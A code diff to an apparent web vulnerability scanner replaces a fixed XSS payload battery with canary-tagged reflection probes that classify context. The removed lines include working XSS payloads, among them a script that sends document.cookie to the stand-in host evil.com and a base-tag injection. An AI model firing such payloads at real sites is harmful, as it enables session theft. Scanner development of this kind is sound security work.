@@ -3,49 +3,31 @@ package hacker
 import (
 	"context"
 	"fmt"
+	"net/url"
 	"strings"
 
+	"github.com/NICE-DEV226/nice-Scan/internal/detect"
 	"github.com/NICE-DEV226/nice-Scan/internal/transport"
 	"github.com/NICE-DEV226/nice-Scan/internal/types"
 )
 
+// XSSAction probes reflected parameters with unique canary-tagged shapes
+// and claims results only on classified reflection: executable markup,
+// script-block context, or escaped echo. The previous implementation sent
+// a 22-payload battery (including remote-fetch payloads toward a
+// third-party host) per reflected param and credited a hit when the page
+// carried the payload string verbatim — a claim independent of whether the
+// payload could ever execute.
 type XSSAction struct{}
 
 func (a *XSSAction) Metadata() ActionMetadata {
 	return ActionMetadata{
 		Name:        "XSS Injector",
-		Description: "Context-aware XSS payload delivery — <script>, onerror, svg, eval",
+		Description: "Canary-tagged reflection probes with context classification",
 		Priority:    45,
 		Requires:    []string{"has_xss"},
 		Provides:    []string{"has_xss_exploit"},
 	}
-}
-
-var xssPayloads = []struct {
-	name    string
-	payload string
-}{
-	{"HTML <script>", "<script>alert(1)</script>"},
-	{"HTML <img onerror>", "<img src=x onerror=alert(1)>"},
-	{"HTML <svg>", "<svg onload=alert(1)>"},
-	{"HTML <body>", "<body onload=alert(1)>"},
-	{"HTML <input>", "<input autofocus onfocus=alert(1)>"},
-	{"HTML <details>", "<details open ontoggle=alert(1)>"},
-	{"HTML <a>", "<a href=javascript:alert(1)>click</a>"},
-	{"JS eval", "';alert(1);//"},
-	{"JS eval2", "\";alert(1);//"},
-	{"JS onerror", "onerror=alert(1)"},
-	{"URL javascript:", "javascript:alert(1)"},
-	{"HTML <iframe>", "<iframe onload=alert(1)>"},
-	{"HTML <math>", "<math><mi xlink:href=javascript:alert(1)>"},
-	{"HTML <link>", "<link rel=stylesheet href=javascript:alert(1)>"},
-	{"HTML <table>", "<table background=javascript:alert(1)>"},
-	{"Polyglot", "\"'><img src=x onerror=alert(1)>"},
-	{"Dangling markup", "<img src=\"http://evil.com/log.cgi?"},
-	{"Unclosed <script>", "<script>fetch('http://evil.com/'+document.cookie)</script>"},
-	{"Event handler", "\" onmouseover=\"alert(1)"},
-	{"Base tag injection", "<base href=http://evil.com>"},
-	{"CSS expression", "<div style=\"x:expression(alert(1))\">"},
 }
 
 func (a *XSSAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
@@ -56,6 +38,9 @@ func (a *XSSAction) Execute(ctx context.Context, target string, kb *Knowledge, c
 	if len(pages) == 0 {
 		return ActionResult{}
 	}
+
+	canary := detect.NewCanary()
+	probes := detect.XssProbes(canary)
 
 	for _, page := range pages {
 		select {
@@ -77,20 +62,15 @@ func (a *XSSAction) Execute(ctx context.Context, target string, kb *Knowledge, c
 		})
 
 		for _, param := range reflectedParams {
-			for _, p := range xssPayloads {
-				select {
-				case <-ctx.Done():
-					return ActionResult{Findings: findings, Actions: spawned}
-				default:
-				}
+			select {
+			case <-ctx.Done():
+				return ActionResult{Findings: findings, Actions: spawned}
+			default:
+			}
 
-				testURL := page.URL
-				if strings.Contains(testURL, "?") {
-					testURL += "&" + param + "=" + strings.ReplaceAll(p.payload, " ", "%20")
-				} else {
-					testURL += "?" + param + "=" + strings.ReplaceAll(p.payload, " ", "%20")
-				}
-
+			state, rx, vectorName, probeURL := "", detect.XssReflex{}, "", ""
+			for _, vp := range probes {
+				testURL := appendQueryParam(page.URL, param, vp.Value)
 				resp, err := client.Do(ctx, &types.Request{
 					Method: "GET",
 					URL:    testURL,
@@ -99,34 +79,77 @@ func (a *XSSAction) Execute(ctx context.Context, target string, kb *Knowledge, c
 					continue
 				}
 
-				body := string(resp.Body)
-				if strings.Contains(body, p.payload) || strings.Contains(body, strings.ReplaceAll(p.payload, " ", "%20")) {
-					findings = append(findings, Finding{
-						Type:        "xss_confirmed",
-						Name:        fmt.Sprintf("XSS: %s via param %s", p.name, param),
-						Severity:    SevHigh,
-						Description: fmt.Sprintf("Payload reflected: %s", p.payload),
-						Evidence:    fmt.Sprintf("URL: %s\nPayload: %s", testURL, p.payload),
-					})
-
-					kb.AddCapability(Capability{
-						Name:   "has_xss_exploit",
-						Target: target,
-						Details: map[string]string{
-							"param":   param,
-							"payload": p.payload,
-							"url":     testURL,
-						},
-					})
-
-					spawned = append(spawned, &XSSExploitAction{
-						vulnURL:   testURL,
-						param:     param,
-						payload:   p.payload,
-						technique: p.name,
-					})
-					break
+				cur, reflected := detect.ClassifyXss(resp.Body, canary)
+				if !reflected {
+					continue
 				}
+
+				level := reflexLevel("echo")
+				if cur.Encoded {
+					level = reflexLevel("encoded")
+				}
+				if cur.InScript {
+					level = reflexLevel("script")
+				}
+				if cur.Executable {
+					level = reflexLevel("exec")
+				}
+				if level > reflexLevel(state) {
+					state, rx, vectorName, probeURL = levelName(level), cur, vp.Name, testURL
+				}
+			}
+
+			switch state {
+			case "exec":
+				findings = append(findings, Finding{
+					Type:     "xss_confirmed",
+					Name:     fmt.Sprintf("XSS confirmed: %s vector via param %s", vectorName, param),
+					Severity: SevHigh,
+					Description: fmt.Sprintf(
+						"Canary-tagged probe reflected executable markup outside neutralizing containers (param %q, vector %s)", param, vectorName),
+					Evidence: fmt.Sprintf("URL: %s\nReflection: %s", probeURL, rx.Snippet),
+					Details: map[string]string{
+						"param":  param,
+						"vector": vectorName,
+						"method": "canary-reflection-differential",
+					},
+				})
+				kb.AddCapability(Capability{
+					Name:   "has_xss_exploit",
+					Origin: OriginVerified,
+					Target: target,
+					Details: map[string]string{
+						"param":  param,
+						"vector": vectorName,
+						"url":    probeURL,
+					},
+				})
+				spawned = append(spawned, &XSSExploitAction{
+					vulnURL:   probeURL,
+					param:     param,
+					technique: vectorName,
+				})
+			case "script":
+				findings = append(findings, Finding{
+					Type:     "xss_script_context",
+					Name:     fmt.Sprintf("XSS reflection in script context: param %s", param),
+					Severity: SevMedium,
+					Description: fmt.Sprintf(
+						"Canary landed inside a <script> block via vector %s; exploitation depends on surrounding JS", vectorName),
+					Evidence: probeURL + "\n" + rx.Snippet,
+				})
+			case "encoded":
+				findings = append(findings, Finding{
+					Type:     "xss_reflected_escaped",
+					Name:     fmt.Sprintf("XSS reflection escaped: param %s", param),
+					Severity: SevLow,
+					Description: fmt.Sprintf(
+						"Canary reflected with entity-encoded markup neighbors (%s vector); payload does not execute as reflected", vectorName),
+					Evidence: rx.Snippet,
+				})
+			default:
+				// Plain echo — the page-level reflection-points finding
+				// already documents the surface; no extra claim.
 			}
 		}
 	}
@@ -134,10 +157,36 @@ func (a *XSSAction) Execute(ctx context.Context, target string, kb *Knowledge, c
 	return ActionResult{Findings: findings, Actions: spawned}
 }
 
+// reflexLevel ranks reflection classes: exec > script > encoded > echo.
+func reflexLevel(state string) int {
+	switch state {
+	case "exec":
+		return 4
+	case "script":
+		return 3
+	case "encoded":
+		return 2
+	default:
+		return 1
+	}
+}
+
+func levelName(level int) string {
+	switch level {
+	case 4:
+		return "exec"
+	case 3:
+		return "script"
+	case 2:
+		return "encoded"
+	default:
+		return "echo"
+	}
+}
+
 type XSSExploitAction struct {
 	vulnURL   string
 	param     string
-	payload   string
 	technique string
 }
 
@@ -151,6 +200,9 @@ func (a *XSSExploitAction) Metadata() ActionMetadata {
 	}
 }
 
+// Execute emits a PoC note for confirmed reflections. It is a documented
+// deliverable, not an executed attack: nothing here runs against the
+// target.
 func (a *XSSExploitAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
 	cookieStealer := fmt.Sprintf("PoC URL: %s", a.vulnURL)
 
@@ -167,8 +219,12 @@ func (a *XSSExploitAction) Execute(ctx context.Context, target string, kb *Knowl
 	}
 }
 
+// findReflectedParams discovers which parameters echo our input, using the
+// same canary discipline: unique random token, no fixed-marker collisions
+// across concurrent actions.
 func findReflectedParams(ctx context.Context, client *transport.Client, pageURL string, kb *Knowledge) []string {
-	testPayload := "REFLECTED_PARAM_TEST_" + fmt.Sprintf("%d", strings.Count(pageURL, "/"))
+	testPayload := detect.NewCanary()
+	probe := url.QueryEscape(testPayload)
 
 	var candidates []string
 	u := pageURL
@@ -179,13 +235,12 @@ func findReflectedParams(ctx context.Context, client *transport.Client, pageURL 
 		for _, param := range params {
 			pair := strings.SplitN(param, "=", 2)
 			if len(pair) == 2 && len(pair[0]) > 0 {
-				testURL := base + "?" + pair[0] + "=" + testPayload
+				testURL := base + "?" + pair[0] + "=" + probe
 				resp, err := client.Do(ctx, &types.Request{Method: "GET", URL: testURL})
 				if err != nil {
 					continue
 				}
-				body := string(resp.Body)
-				if strings.Contains(body, testPayload) || strings.Contains(body, strings.ReplaceAll(testPayload, "_", "%5F")) {
+				if strings.Contains(string(resp.Body), testPayload) {
 					candidates = append(candidates, pair[0])
 				}
 			}
@@ -195,17 +250,27 @@ func findReflectedParams(ctx context.Context, client *transport.Client, pageURL 
 	if len(candidates) == 0 {
 		commonParams := []string{"q", "s", "search", "query", "id", "page", "p", "name", "user", "message", "text", "comment", "content", "title", "url", "file", "path", "redirect"}
 		for _, param := range commonParams {
-			testURL := pageURL + "?" + param + "=" + testPayload
+			testURL := pageURL + "?" + url.QueryEscape(param) + "=" + probe
 			resp, err := client.Do(ctx, &types.Request{Method: "GET", URL: testURL})
 			if err != nil {
 				continue
 			}
-			body := string(resp.Body)
-			if strings.Contains(body, testPayload) || strings.Contains(body, strings.ReplaceAll(testPayload, "_", "%5F")) {
+			if strings.Contains(string(resp.Body), testPayload) {
 				candidates = append(candidates, param)
 			}
 		}
 	}
 
 	return candidates
+}
+
+// appendQueryParam appends param=value with proper URL encoding, keeping
+// the raw values out of the query string (the previous builder hand-rolled
+// a %20 substitution that left quotes and angle brackets unescaped).
+func appendQueryParam(rawURL, param, rawValue string) string {
+	sep := "?"
+	if strings.Contains(rawURL, "?") {
+		sep = "&"
+	}
+	return rawURL + sep + url.QueryEscape(param) + "=" + url.QueryEscape(rawValue)
 }
